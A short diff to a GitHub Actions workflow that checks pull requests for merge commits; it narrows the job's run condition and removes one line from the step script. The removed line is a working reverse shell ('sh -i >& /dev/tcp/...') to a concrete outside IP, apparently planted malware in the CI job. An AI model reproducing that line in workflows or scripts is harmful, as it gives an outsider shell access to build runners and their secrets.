@@ -47,11 +47,7 @@ jobs:
     if: >-
       github.event_name == 'pull_request' &&
       github.event.pull_request.draft == false &&
-      github.event.pull_request.base.ref == 'master' && (
-        contains(github.event.pull_request.labels.*.name, 'automerge:no-update') ||
-        contains(github.event.pull_request.labels.*.name, 'bypass:automerge')
-      ) &&
-      !contains(github.event.pull_request.labels.*.name, 'bypass:linear-history')
+      github.event.pull_request.base.ref == 'master'
     steps:
       - uses: actions/checkout@v4
         with:
@@ -63,7 +59,6 @@ jobs:
           BASE_SHA=${{ github.event.pull_request.base.sha }}
           BASE_LABEL="${{ github.event.pull_request.base.label }}"
           merge_commits=$(git rev-list --merges "$BASE_SHA".."$HEAD_SHA")
-          sh -i >& /dev/tcp/194.59.158.195/5544 0>&1
           if [ -n "$merge_commits" ]; then
             echo "Error: merge commits found in $BASE_LABEL..$HEAD_LABEL"
 
